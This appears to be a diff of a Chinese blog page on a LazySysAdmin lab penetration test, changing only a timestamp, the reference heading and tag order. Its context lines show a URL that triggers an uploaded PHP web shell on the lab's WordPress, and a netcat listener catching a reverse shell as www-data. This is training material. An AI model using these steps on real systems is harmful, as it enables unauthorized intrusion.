@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA16.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA17.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA18.png">
-<meta property="og:updated_time" content="2019-10-10T07:35:39.823Z">
+<meta property="og:updated_time" content="2019-10-19T12:40:23.814Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="LazySysAdmin靶机渗透测试">
 <meta name="twitter:description" content="LazySysAdmin环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.199.133） 靶机：LazySysAdmin（IP：192.168.199.136） 渗透测试Netdiscover扫描网段，发现靶机IP地址 1234567891011netdiscover -r 192.168.199.0/24Currently scanning:">
@@ -263,7 +263,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.31.19.221/wordpress/?p=Knlvre.php</span><br></pre></td></tr></table></figure>
 <p>然后就可以拿下shell，后续提权不再去做了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line">connect to [172.31.19.207] from (UNKNOWN) [172.31.19.221] 59424</span><br><span class="line">Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><span class="line"> 23:54:05 up 36 min,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&apos;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/2789" target="_blank" rel="noopener">https://xz.aliyun.com/t/2789</a></p>
+<hr>
+<p><strong>Reference</strong></p>
+<p><a href="https://xz.aliyun.com/t/2789" target="_blank" rel="noopener">https://xz.aliyun.com/t/2789</a></p>
 <p><a href="https://www.cnblogs.com/yuzly/p/10800861.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10800861.html</a></p>
 
       
@@ -485,11 +487,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
